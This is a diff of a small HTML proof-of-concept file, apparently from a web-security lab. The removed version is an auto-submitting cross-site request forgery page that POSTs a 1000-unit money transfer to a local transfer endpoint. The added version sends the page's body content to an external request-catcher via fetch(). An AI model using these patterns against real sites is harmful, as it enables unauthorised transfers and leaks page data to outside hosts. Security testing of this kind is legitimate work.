@@ -1,48 +1,18 @@
 <!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]>      <html class="no-js"> <!--<![endif]-->
 <html>
-  <head>
-    <meta charset="utf-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <title></title>
-    <meta name="description" content="" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <link rel="stylesheet" href="" />
-  </head>
-  <body onload="document.createElement('form').submit.call(document.getElementById('getForm'))"></body>">
-    <form
-      id="getForm"
-      action="http://192.168.2.98:49698/transfer"
-      method="POST"
-    >
-      <div class="form-row">
-        <div class="form-group col-md-6">
-          <label for="inputTo">To</label>
-          <input
-            type="text"
-            class="form-control"
-            id="inputTo"
-            name="user_to"
-            value="user1@gmail.com"
-            placeholder="Who do you want to transfer to?"
-          />
-        </div>
-        <div class="form-group col-md-6">
-          <label for="inputAmount">Amount</label>
-          <input
-            type="number"
-            class="form-control"
-            id="inputAmount"
-            name="amount"
-            value="1000"
-            placeholder="Amount to transfer"
-          />
-        </div>
-      </div>
-      <button id="modal" type="submit" class="btn btn-primary">
-        Send the Money!
-      </button>
-    </form>
-
-    <script src="" async defer></script>
+  <head> </head>
+  <body id="headercheck">
+    Hey New Name
+    <script type="text/javascript">
+      document.title = document.getElementsByTagName("body")[0].innerHTML;
+      console.log(document.title);
+      fetch("https://catchtag.free.beeceptor.com/" + document.title)
+        .then((response) => response.json())
+        .then((data) => console.log(data));
+    </script>
   </body>
 </html>
